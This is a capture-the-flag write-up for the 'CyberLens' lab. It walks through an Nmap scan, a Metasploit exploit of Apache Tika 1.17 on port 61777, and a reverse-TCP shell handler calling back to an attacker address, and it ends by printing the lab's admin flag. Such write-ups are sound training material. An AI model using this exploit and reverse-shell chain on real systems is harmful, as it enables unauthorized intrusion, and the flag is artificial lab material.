# CyberLens - Penetration Testing Write-up

## 1. Reconnaissance

The engagement initiated by mapping the target IP address to the designated hostname within the local `/etc/hosts` file to ensure proper routing for named virtual hosts.

```bash
echo '10.81.156.224 cyberlens.thm' >> /etc/hosts
```

A comprehensive Nmap scan was executed against the target IP (`10.65.146.105`) to enumerate open ports and identify running services. The scan confirmed the target as a Windows host and revealed the following notable open ports:

*   **135/tcp, 139/tcp:** Microsoft Windows RPC and netbios-ssn.
*   **3389/tcp:** Microsoft Terminal Services (RDP).
*   **5985/tcp, 47001/tcp:** Microsoft HTTPAPI httpd 2.0.
*   **49664 - 49674/tcp:** Various Microsoft Windows RPC services.
*   **61777/tcp:** Jetty 8.y.z-SNAPSHOT HTTP server.

## 2. Exploitation

Based on the enumeration, the service running on port 61777 was targeted. A vulnerability associated with Apache Tika 1.17 was identified and exploited using the Metasploit Framework. 

*   **Metasploit Module:** `exploit/windows/http/apache_tika_jp2_jscript`
*   **Target Configuration:** `RHOST` was set to `cyberlens.thm` and `RPORT` was pointed to `61777` with SSL disabled.

To catch the incoming connection from the target, a Metasploit listener was configured and executed:

```bash
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 192.168.152.214
set LPORT 4443
exploit
```

Executing the primary Apache Tika exploit successfully triggered the payload, resulting in a reverse TCP connection back to the configured handler (`192.168.152.214:4443`). This granted a Windows command shell on the target system (Microsoft Windows Version 10.0.17763.1821).

## 3. Post-Exploitation & Flag Retrieval

Once the reverse shell was established, directory traversal was utilized to navigate from the initial access point (`C:\Windows\system32`) to the system's user directories. The shell successfully accessed the `C:\Users\Administrator\Desktop` directory, confirming high-level system privileges.

Listing the contents of the Administrator's desktop revealed a target file named `admin.txt`. The contents were extracted using the Windows `type` command to retrieve the final administrative flag:

```cmd
C:\Users\Administrator\Desktop>type admin.txt
THM{3lev@t3D-4-pr1v35c!}
```